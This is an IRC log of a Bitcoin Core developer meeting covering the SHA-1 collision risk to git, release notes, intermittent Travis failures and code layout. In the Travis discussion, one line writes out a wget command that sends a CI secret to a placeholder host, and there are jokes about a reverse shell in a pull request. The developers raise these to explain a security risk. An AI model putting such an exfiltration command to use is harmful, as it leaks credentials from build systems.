@@ -1,0 +1,304 @@
+19:00:31 <wumpus> #startmeeting
+19:00:31 <lightningbot> Meeting started Thu Feb 23 19:00:31 2017 UTC.  The chair is wumpus. Information about MeetBot at http://wiki.debian.org/MeetBot.
+19:00:31 <lightningbot> Useful Commands: #action #agreed #help #info #idea #link #topic.
+19:00:32 <wumpus> #meetingstart
+19:01:08 <gmaxwell> #bitcoin-core-dev Meeting: wumpus sipa gmaxwell jonasschnelli morcos luke-jr btcdrak sdaftuar jtimon cfields petertodd kanzure bluematt instagibbs phantomcircuit codeshark michagogo marcofalke paveljanik NicolasDorier
+19:01:13 <jonasschnelli> hi
+19:01:25 <wumpus> cfields: we could ask if dooglus is using a tablet/touch screen, or was using it at that time.
+19:01:43 <cfields> wumpus: oh, haha, i didn't notice it was the same reporter
+19:01:53 <kanzure> hi.
+19:02:14 <sipa> present
+19:02:15 <petertodd> hi
+19:02:26 <jonasschnelli> wumpus: did you reproduce 9814 with the same setup? Ubuntu and Qt 5.3?
+19:02:28 <cfields> oh, nm
+19:02:46 <petertodd> so quick note re: git and SHA1 collisions: https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2017-February/013600.html
+19:02:54 <wumpus> jonasschnelli: no, I did not reproduce it
+19:02:58 <sipa> petertodd: i wanted to bring that up
+19:03:04 <wumpus> #topic git and sha collisions
+19:03:29 <petertodd> so while many people will say git isn't vulnerable if you trust a git repo's maintainers, that is *not* true as a pull-req could add a colliding file
+19:03:38 <luke-jr> sounds like MD5 breakage
+19:03:38 <achow101> does git and github only support sha1?
+19:03:42 <sipa> achow101: yes
+19:03:50 <sipa> i only read about this new sha1 attack an hour ago... how hard is it to create a collision?
+19:04:01 <petertodd> probably only relevant with binary files, but we don't know 100% yet because details of the attack haven't been published
+19:04:03 <luke-jr> achow101: IIRC, git is designed in such a way that changing SHA1 is very difficult
+19:04:04 <achow101> sipa: still very hard
+19:04:20 <sipa> i see
+19:04:20 <gmaxwell> sipa: it's not a new attack its the one published from a coule years ago with about 2^64 complexity.  There were some estimates of a cost on EC2 of about $110k.
+19:04:26 <wumpus> 110 GPU-years or so
+19:04:31 <gmaxwell> It's just actually been executed now.
+19:04:48 <sipa> gmaxwell: no, it seems new research was done that simplifies it further
+19:04:50 <gmaxwell> (at least thats my understanding)
+19:04:53 <petertodd> gmaxwell: is it confirmed that google's efforts don't include any advances on what was already known to be possible?
+19:04:55 <gmaxwell> oh. I missed that, okay!
+19:05:26 <luke-jr> is the git project taking any action now?
+19:05:36 <BlueMatt> luke-jr: doesnt look like it
+19:05:37 <wumpus> Google and CWI, the dutch center for mathetmatics and informatics
+19:05:44 <BlueMatt> luke-jr: (at least no movement as of this morning)
+19:05:52 <gmaxwell> I think they already said they wouldn't before?
+19:06:09 <sipa> i wonder how hard it is to create an overlay... that goes back in history, computes a sha256 for every tree and commit, and then include gpg signatures on those?
+19:06:23 <jonasschnelli> sipa: great idea
+19:06:38 <petertodd> sipa: I have code for something very similar to that in OpenTimestamps actually, and people have written tools to do that as well other than opentimestamps
+19:06:40 <btcdrak> The exploit has a fancy name as usual http://shattered.io/
+19:06:44 <gmaxwell> http://marc.info/?l=git&m=115678778717621&w=2 "The only _dangerous_ kind of collision is the inadvertent kind,
+19:06:47 <gmaxwell> but that's obviously also the very very unlikely kind."
+19:06:52 <BlueMatt> sipa: I was looking this morning to see if you could reasonably patch git to do so directly, looks hard.....still, we can update our dev scripts to do a sha256sum of all committed files and sign that as well
+19:07:47 <sipa> BlueMatt: signing just the trees i guess is an easy first step
+19:07:47 <btcdrak> according to the site "How is GIT affected?
+19:07:47 <btcdrak> GIT strongly relies on SHA-1 for the identification and integrity checking of all file objects and commits. It is essentially possible to create two GIT repositories with the same head commit hash and different contents, say a benign source code and a backdoored one. An attacker could potentially selectively serve either repository to targeted users. This
+19:07:47 <btcdrak> will require attackers to compute their own collision."
+19:07:47 <wumpus> but the tree is a sha1 hash too, isn't it?
+19:07:47 <BlueMatt> gmaxwell: yup, great, linus and associated kernel folks continue to willfully ignore that security matters even the slightest bit
+19:07:47 <gmaxwell> what does the signed commit stuff sign? if it signs the commit message, then we can include a sha256 in it and have the verify check that too.
+19:07:47 <BlueMatt> wumpus: yes, it would have to be a separate thing
+19:07:47 <wumpus> if you don't trust SHA1 anymore, that rabbit hole goes deep
+19:07:47 * luke-jr votes banning binary files in any case :p
+19:07:53 <sdaftuar> is it worth periodically running https://github.com/cr-marcstevens/sha1collisiondetection on commits in our repo?
+19:07:54 <BlueMatt> wumpus: eg the merge scripts could include a hash of sha256sum * in the commit message
+19:08:07 <petertodd> gmaxwell: the signed commit stuff signs a SHA1 hash, but it's easy to extend that with a gnupg wrapper; I could take the code from OpenTimestamps and do that
+19:08:08 <BlueMatt> sdaftuar: I have a patch for git to use that as the hash function
+19:08:16 <BlueMatt> and abort() if it detects a potentially-bad hash
+19:08:22 <sipa> BlueMatt: sounds like a great idea
+19:08:39 <kanzure> off-topic, but i wonder what git could change to make upgrading backwards-compatible in the future. for now i think it must be an incompatible upgrade to switch to another hash function?
+19:08:39 <sipa> (including the sha256sum * in the merge commit message)
+19:08:42 <wumpus> BlueMatt: if bad hashes are rare, that makes sense
+19:08:47 <petertodd> gmaxwell: the one thing OpenTimestamps doesn't already do is recalculate hashes of *prior* commits with SHA256, but that'd be easy to add
+19:09:12 <kanzure> i would also like the gh-meta repository maintainer to consider timestamping with opentimestamps at some point, i dunno who he is and i haven't pestered him yet
+19:09:25 <BlueMatt> wumpus: the authors of that hash code claim 2**-90
+19:09:32 <kanzure> er, the bitcoin-gh-meta repository person
+19:09:32 <BlueMatt> (for random hits)
+19:09:32 <luke-jr> detecting it after the fact seems like it would still be irrepairable?
+19:10:03 <wumpus> kanzure: iwilcox on IRC
+19:10:10 <petertodd> kanzure: git could easily have git commits simultaneously generate and sign two different hash functions; quite feasible to implement. I'll bet you I could pull that off in a week or two of work.
+19:10:12 <kanzure> oh good, he is easily pesterable.
+19:10:46 <kanzure> petertodd: yea but needs to be backwards compatible; and the bloat from two commits does not sound ideal. are they considering that btw?
+19:10:53 <wumpus> BlueMatt: if the chance of an inadvertent match is that low, in that case, abort() /reject is a great solution
+19:11:25 <luke-jr> kanzure: I'd guess you simply list the parent commit hashes twice?
+19:11:27 <petertodd> kanzure: no bloat involved - the data can be shared across both commits
+19:12:03 <kanzure> ah okay. well, i hadn't heard that proposal today, someone should check if git upstream is thinking about that.
+19:12:09 <gmaxwell> probably said enough on this for now.
+19:12:15 <btcdrak> There's a conversation on the git mailing list https://public-inbox.org/git/xmqqk28g92h7.fsf@gitster.mtv.corp.google.com/T/#t
+19:12:33 <petertodd> gmaxwell: ack
+19:12:42 <wumpus> yes, agreed
+19:12:58 <petertodd> next topic
+19:13:06 <wumpus> #topic help cfields with adding performance-related release notes
+19:13:08 <wumpus> https://github.com/bitcoin/bitcoin/pull/9787
+19:13:13 <cfields> quick call for 0.14 perf improvements on 9897
+19:13:18 <cfields> heh, thanks :)
+19:13:52 <cfields> err... #9787
+19:13:54 <gribble> https://github.com/bitcoin/bitcoin/issues/9787 | release: add a few performance-related notes by theuni · Pull Request #9787 · bitcoin/bitcoin · GitHub
+19:13:57 <jtimon> kanzure: yeah I assume changing the hash function would be a hardfork for old repositories :p
+19:14:16 <cfields> if anyone added a big user-facing performance improvement for 0.14, please speak up
+19:14:46 <gmaxwell> jtimon: please don't use bitcoin terms for other things especially non-consensus systems. The classic words "backwards incompatible" are fine. :P
+19:15:03 <jtimon> gmaxwell: yep, sorry, was a bad joke
+19:15:29 <wumpus> jtimon: dependso n how close the new hash function is to SHA-1. If it gets the same output 1-2**90 of the time, most repositories won't be affected
+19:15:30 <gmaxwell> cfields: no measurements in the notes?
+19:16:37 <cfields> gmaxwell: see the pr description. I've taken some measurements on the net stuff, but they're highly localized.
+19:17:20 <gmaxwell> wish I realized no one was going to benchmark I could have started one last night. :P
+19:17:40 <jeremyrubin> I would also note that the cuckoocache means nodes wanting to use more cores but had performance degrade should try more cores again
+19:18:13 <sipa> right, cuckoocache has no effect at low parallellism, i think?
+19:18:50 <morcos> sipa: no it's smarter about keepign the right signatures in the cache due to the generations and lazy eviction
+19:18:54 <cfields> gmaxwell: i've done lots of benchmarking. But as I said, I'm not sure how to translate that into helpful figures
+19:19:21 <gmaxwell> sipa: e.g. it will make reorgs much faster!
+19:19:35 <cfields> well the alternative is to use a reference system/environment for each improvement
+19:19:46 <gmaxwell> cfields: users don't care about each improvement.
+19:20:15 <wumpus> it also doesn't need to be super precise
+19:20:25 <gmaxwell> cfields: "Sync with least release takes N hours now, sync with new release takes Y now." would be nice.
+19:20:53 <jonasschnelli> or syncs are rougle XYZ% faster...
+19:21:13 <jonasschnelli> use the ~ and nobody will blame you afterwards. :)
+19:21:30 <jeremyrubin> use two ~~ to be extra aproximate
+19:21:43 <wumpus> it's marketing not science :p hehe
+19:21:48 <gmaxwell> but ~~ will just give you the same number you put in!
+19:22:44 <jeremyrubin> The is-approximately operator is non-involutive ;)
+19:22:51 <gmaxwell> Well people just have no general idea of the impact.  Marketing would be saying that it's 2x faster rathern the 3x faster because 2x is more plausable. :P
+19:22:51 <jeremyrubin> anyways
+19:23:21 <cfields> ok, i'll add a vague 0.13 vs 0.14 sync time. The 0.13 will take time though, I haven't had the patience to finish one yet
+19:23:28 <jeremyrubin> Could be cool to spin up a few different EC2 instances to compare...
+19:23:39 <wumpus> EC is not a good comparison environment
+19:23:45 <wumpus> sloooow i/o
+19:23:56 <sipa> i'm syncing on a RPi3
+19:24:02 <sipa> sloooow
+19:24:09 <wumpus> what storage?
+19:24:13 <luke-jr> lol
+19:24:27 <sipa> microsd card
+19:24:27 <jonasschnelli> uh
+19:24:27 <cfields> i used EC for my sync benching because i figured it represented a very typical use-case
+19:24:33 <wumpus> that's the cause of the slowness, likely
+19:24:34 <jeremyrubin> Actually I like that. We should publish the worst system that can sync :p
+19:24:47 <sipa> wumpus: absolutely
+19:24:50 * luke-jr ponders trying on his USB Armory again
+19:25:01 <jtimon> other topics?
+19:25:07 <wumpus> sipa: if it's really CPU bound, don't forget to use the experimental ARM assembly secp256k1 :)
+19:25:23 <wumpus> sipa: right, as I expected
+19:25:31 <cfields> For reference, 0.14 sync took roughly 3 hours on ec2 w/ 4 cpu cores
+19:25:42 <sipa> wumpus: i enabled it, but it's not nearly CPU bound
+19:25:51 <achow101> topic: rc2 status?
+19:26:10 <wumpus> #topic rc2 status
+19:26:24 <wumpus> I think it should be ready to tag
+19:26:57 <wumpus> well, need to update the translations and release notes to include changes since rc1, but I don't think there's anything that still needs to be solved
+19:27:04 <achow101> there are still open prs in the milestone though
+19:27:22 <achow101> (well 1 that actually does something)
+19:27:30 <wumpus> achow101: one is release notes - that can go in any time before final
+19:27:58 <wumpus> #9829 would be nice to get in, but it's breaking travis
+19:28:00 <gribble> https://github.com/bitcoin/bitcoin/issues/9829 | Fix importmulti returning rescan errors for wrong keys by ryanofsky · Pull Request #9829 · bitcoin/bitcoin · GitHub
+19:28:49 <jtimon> ryanofsky: ping
+19:29:20 <ryanofsky> should i do something? bump travis?
+19:29:23 <wumpus> (I've already tried to retrigger it so it's not one of today's intermittent problems)
+19:29:56 <wumpus> ryanofsky: I don't think that helps
+19:30:16 <gmaxwell> Does it pass locally?
+19:30:39 <ryanofsky> yeah, the errors are the same "__pthread_mutex_lock: Assertion `mutex->__data.__owner == 0' failed" things i've seen on other prs
+19:31:07 <wumpus> ryanofsky: oh, https://github.com/bitcoin/bitcoin/issues/9825
+19:31:17 <ryanofsky> i had to bump one of my prs last week 5-6 times to make travis pass
+19:31:22 <wumpus> ryanofsky: okay, will respin
+19:32:34 <bitcoin-git> [13bitcoin] 15laanwj pushed 1 new commit to 060.14: 02https://github.com/bitcoin/bitcoin/commit/847e3753a6d6a6ab4dd081e2945cb200faf730d4
+19:32:34 <bitcoin-git> 13bitcoin/060.14 14847e375 15Wladimir J. van der Laan: qt: pre-rc2 translations update
+19:33:00 <morcos> Can we figure out when these travis errors started?  Do we get them on personal travis instances?  Can we bisect?  Seems likely somethign changed on our end right?
+19:33:12 <wumpus> #topic travis issues
+19:33:16 <gmaxwell> do we have any idea whats causing that? I assume no one has hit it locally?  I left test bitcoin running in a loop when I first saw it on the off chance it was an ASLR mediated thing that was only hitting travis sometimes.
+19:33:32 <gmaxwell> (no results, of course)
+19:33:37 <jonasschnelli> We recently added a missing ecc_start to bitcoin-tx... but I can't see any relation
+19:33:50 <gmaxwell> jonasschnelli: I don't even see why you mention that?
+19:33:51 <wumpus> I tried to reproduce #9825 for hours on a trusty vm, with five threads for a few hours... but no dice
+19:33:52 <gribble> https://github.com/bitcoin/bitcoin/issues/9825 | Intermittent FAIL: test/test_bitcoin in Travis · Issue #9825 · bitcoin/bitcoin · GitHub
+19:34:01 <wumpus> to bitcoin-tx? yea, that won't make a difference
+19:34:26 <jonasschnelli> gmaxwell: becuase of that "test_bitcoin: key.cpp:300: void ECC_Start(): Assertion `secp256k1_context_sign == __null' failed."?
+19:34:31 <gmaxwell> It looks like test_bitcoin fails before it even really starts. So global constructors or somehting in the C libraries.
+19:34:43 <wumpus> jonasschnelli: that's only a effect of the failure
+19:34:44 <jeremyrubin> I noticed that one of the builds seems to have some additional bounds checks enabled -- might be nice to enable those across travis tests? Hopefully no code relies on bounds checks/not
+19:34:49 <wumpus> jonasschnelli: *everything* after the initial failure fails
+19:34:55 <wumpus> jonasschnelli: secp256k1 is innocent
+19:35:00 <jonasschnelli> ah.. I see.
+19:35:23 <jtimon> perhaps we're forgetting some EEC_stop() somewhere?
+19:35:32 <gmaxwell> no. geesh
+19:35:47 <wumpus> no, I'm fairly sure it doesn't have to do with secp256k1
+19:35:57 <wumpus> it's something done with mutexes before mutexes are initialized
+19:36:20 <jtimon> ok, I really have no idea what's happening
+19:36:24 <wumpus> looks like some kind of race condition, but I have no idea where or what
+19:36:47 <wumpus> if it happens it *always* happens in test_bitcoin, never in bitcoind, bitcoin-cli, bitcoin-tx
+19:37:05 <gmaxwell> I wonder if we could make our travis build script rerun any failing case under gdb so it would print a backtrace?
+19:37:27 <BlueMatt> gmaxwell: probably using coredumps?
+19:37:40 <wumpus> if you rerun it it will probably pass
+19:37:42 <jtimon> perhaps some of the globals initialized in test_bitcoin.cpp ?
+19:37:43 <gmaxwell> or that.
+19:37:48 <jeremyrubin> in theory boost test runner can start gdb
+19:37:53 <jtimon> just thinking out loud again...
+19:37:54 <jonasschnelli> Could it be related to the boost test framework?
+19:37:55 <BlueMatt> eg if it crashes coredump and gdb print all backtraces
+19:38:10 <wumpus> but yes, getting a core file would be useful
+19:38:14 <jeremyrubin> boost test runner can start gdb. I wonder if it reads .gdbinit
+19:38:15 <gmaxwell> BlueMatt: thats probably the right way to go there.
+19:38:25 <wumpus> although you need the executable too, to debug it
+19:38:28 <gmaxwell> jeremyrubin: yes, but if it crashes its probably not in a good state to do so. :P
+19:38:32 <wumpus> and uploading from travis :(
+19:38:40 <BlueMatt> wumpus: i mean we can at least print stack traces
+19:38:47 <gmaxwell> wumpus: just detect the crash in the script and run gdb.
+19:38:53 <gmaxwell> and print the backtraces.
+19:39:05 <wumpus> ok, yes, backtrace would help
+19:40:02 <gmaxwell> do we know when the first of these errors was?
+19:40:07 <wumpus> jtimon: yes, it sounds ilke a global initialisation order fiasco
+19:40:28 <jeremyrubin> could be nice to detect the failing case, and then re-run it under say, valgrind
+19:40:47 <wumpus> no, I don't know. I started getting annoyed by them today, but it's been going on yesterday at least as well
+19:41:39 <wumpus> bisecting this with travis would take *a lot* of patience
+19:41:53 <gmaxwell> that kind of suggests that it's a change on travis' end, no? we haven't had any changes on 0.14 in the past two days that could have caused this?
+19:42:06 <wumpus> I don't think so either.
+19:42:16 <wumpus> the big locking changes are longer ago
+19:42:27 <wumpus> and it didn't start after that
+19:42:50 <jeremyrubin> topic suggest -- code reorganizing (renaming rpc tests, etc)
+19:43:05 <gmaxwell> does something in the travis log report what hardware it ran on?
+19:43:06 <wumpus> still, the question is whether it is a change at travis's end that exposes something in our code
+19:43:15 <gmaxwell> e.g. so we could correlate failures with a specific host?
+19:43:22 <wumpus> or something that is completely broken on their end
+19:43:30 <wumpus> gmaxwell: I'm afraid not. Wasn't able to find it
+19:43:49 <wumpus> I don't think they give access to that information
+19:43:59 <jnewbery> wumpus: why is uploading from travis :( ? is it something you've tried before?
+19:44:14 <wumpus> jnewbery: it's a pit of snakes, security-wise
+19:44:21 <ryanofsky> this is older than 2 days, i first noticed these last friday on 9773: https://github.com/bitcoin/bitcoin/pull/9773#issuecomment-280684263
+19:44:40 <wumpus> jnewbery: we could temporary have it submit files somewhere to debug an issue, I guess
+19:45:24 <jnewbery> It can be configured it to upload artifacts to S3: https://docs.travis-ci.com/user/uploading-artifacts/
+19:45:30 <gmaxwell> jeremyrubin: the issue there is just in terms of provisioning travis with secrets.
+19:45:37 <kanzure> no private environment variables?
+19:45:40 <gmaxwell> er darnit, too many js in here.
+19:45:54 <wumpus> private environment variables don't work for pull requests, the test script could be replaced with anything
+19:45:57 <jeremyrubin> gmaxwell: i was wat-ing :)
+19:46:06 <gmaxwell> kanzure: PR's can steal them.
+19:46:07 <jeremyrubin> Can you get a shell to travis
+19:46:20 <wumpus> including echo $SECRET_CODE or wget https://host/secretcode?$SECRETCODE
+19:46:22 <kanzure> cool. hm.
+19:46:30 <jeremyrubin> (probably against TOS)
+19:46:51 <MarcoFalke> I think you can specify secrets that are valid on branches only, but I might be wrong
+19:46:56 <gmaxwell> jeremyrubin: A assume just open a PR that connects back to you. :P
+19:47:08 <wumpus> lol a reverse shell in a PR
+19:47:13 <BlueMatt> I assume you can, but, yea ToS (not to mention monopolizing their service....)
+19:47:32 <gmaxwell> wait, you're all not mining bitcoins there already?
+19:47:41 <jeremyrubin> I heard someone did that recently right?
+19:48:10 <gmaxwell> in any case, we've wasted most of a perfectly good hour on this. :P
+19:48:18 <wumpus> I like the idea of uploading the executable and core files more. They could be pushed to a private server, no need to openly host them, that meanst here's less reason for people up to no good to inject anything
+19:48:56 <wumpus> the biggest security worry was with hosting the built binaries
+19:49:07 <jtimon> topic code reorganizing?
+19:49:13 <wumpus> bleh
+19:49:15 <wumpus> okay :p
+19:49:23 <wumpus> #topic code reorganizing
+19:49:25 <jnewbery> suggested (marginally related) topic: code coverage and benchmark tracking
+19:49:27 <gmaxwell> we should ask travis for a feature that sets an enviroment variable to H(project secret || commit hash) ... and then we could have something whitelist uploads from specific PRs (e.g. by known people)
+19:49:36 <jtimon> it's 10 mins, so no time for a big topic I think
+19:50:04 <jeremyrubin> I have a POC branch which moves most of the pure data structures  to a datastructures dir.
+19:50:06 <gmaxwell> Rename rpctests to tests rename test_bitcoin to useless_thing_that_crashes_in_travis. Done.
+19:50:36 <wumpus> gmaxwell: yep
+19:50:39 <jtimon> jeremyrubin: you mean including things like CTransaction and CBlockHeader?
+19:50:41 <luke-jr> jeremyrubin: that doesn't sound like the right direction
+19:50:43 <jeremyrubin> no
+19:50:49 <jeremyrubin> non-bitcoin specific ones
+19:50:51 <gmaxwell> jeremyrubin: really? datastructures?  shall we have a file called functions.cpp and a file called variables.cpp too? :P
+19:50:57 <jeremyrubin> E.g., prevector
+19:50:58 <luke-jr> XD
+19:51:07 <luke-jr> jeremyrubin: oh, okay, that sounds less bad
+19:51:08 <gmaxwell> oh you mean things like effective language extensions.
+19:51:12 <jtimon> I would prefer to move prevector to the consensus dir
+19:51:28 <wumpus> yea, prevector is consensus critical
+19:51:32 <gmaxwell> suggests that the name still isn't good in that luke and I misunderstood it immediately. :P
+19:51:41 <jeremyrubin> so is secp256k1 ;)
+19:51:50 <sipa> so is libc
+19:51:52 <jtimon> like in https://github.com/bitcoin/bitcoin/pull/8328
+19:51:58 <wumpus> yes, we're not renaming secp256k1 are we
+19:52:00 <luke-jr> move prevector to boost
+19:52:01 * luke-jr hides
+19:52:02 <gmaxwell> Okay, so step one we move libc under consensus/ ...
+19:52:32 <jeremyrubin> Anyways, I think it would be nice to move things like that, which could later be made upstream repos
+19:52:38 <wumpus> I don't think this is going anywhere, everyone has a different opinoin on what file to put where
+19:52:47 <gmaxwell> lpad.js.
+19:53:11 <luke-jr> Does prevector have any usage outside consensus?
+19:53:19 <jeremyrubin> I think the reason I'd want that is it makes it easier to have more exhaustive testing and also allows other users to more easily use such datastructures
+19:53:29 <sipa> luke-jr: it probably should :)
+19:53:40 <wumpus> do we have any unique data structures that anyone else inthe world would want to use?
+19:53:41 <jtimon> jeremyrubin: yeah I would like libconsensus to be an "upstream repo" like libsecp256k1, but we would need to complete it first
+19:53:55 <gmaxwell> jeremyrubin: I don't think any of us care to maintain things like prevector for other usage. Making a good library takes a tremendous amount of work.
+19:54:00 <wumpus> I don't think a bitcoin-datastructures library makes sense
+19:54:01 <wumpus> right
+19:54:17 <wumpus> if we offer a library it should be something useful to bitcoin users
+19:54:39 <gmaxwell> Obviously if the author of something like that wants to create a library for other usage, thats fine! but not a project priority.
+19:54:40 <wumpus> like a wallet library, or extend libconsensus, ...
+19:55:15 <wumpus> sure, you can do whatever you want with the files in the repository, if you need it in your project you can make a library out of it for your own use, or just copy the file, etc
+19:55:18 <gmaxwell> from a code org perspective I don't see a problem with moving things like prevector, limitedmap into a utility function directory.. With just the understanding that many of those are used in consensus code too.
+19:55:32 <wumpus> not everything needs to be maintained as a library
+19:55:32 <jtimon> but since each dev seems to have a different idea of what a "complete libconsensus" should look like...
+19:56:04 <wumpus> gmaxwell: me neither
+19:56:07 <kallewoof> Compartmentalizing bitcoin into separate modules seemed like a plan but maybe not shared by everyone. If it is a shared plan restructuring file places seems important.
+19:56:08 <luke-jr> I don't mind it, but IMO more important to work toward more useful library splitting
+19:56:14 <sipa> gmaxwell: agree, some things are generic enough that they can be seen as extensions of the standard libraries
+19:56:42 <gmaxwell> sipa: e.g. someday libstdc++ could get something that generalizes prevector, if it did, we'd drop prevector and use that.
+19:56:59 <sipa> c++23
+19:57:03 <jonasschnelli> heh
+19:57:04 <gmaxwell> (well STL technically, I guess, point remains)
+19:57:32 <gmaxwell> sipa: C++23 will just integrate libconsensus of course.  template cryprocurrency.
+19:57:39 <wumpus> hehe
+19:57:42 <jeremyrubin> Well that's my point kinda
+19:57:52 <jnewbery> suggested topic: code coverage and benchmark tracking
+19:57:59 <jeremyrubin> the consensus things that aren't overly bitcoin-specific
+19:57:59 <gmaxwell> Except I was making it as a joke. :P
+19:58:01 <wumpus> jnewbery: next week
+19:58:11 <jeremyrubin> Facebook's folly lib is kinda like that
+19:58:13 <wumpus> the meeting is about to close
+19:58:22 <sipa> anyone have any last words?
+19:58:27 <gmaxwell> jnewbery: we can talk about about it after the meeting and discuss further next week. :)
+19:58:44 <jnewbery> gmaxwell: sounds good
+19:58:51 <wumpus> #endmeeting
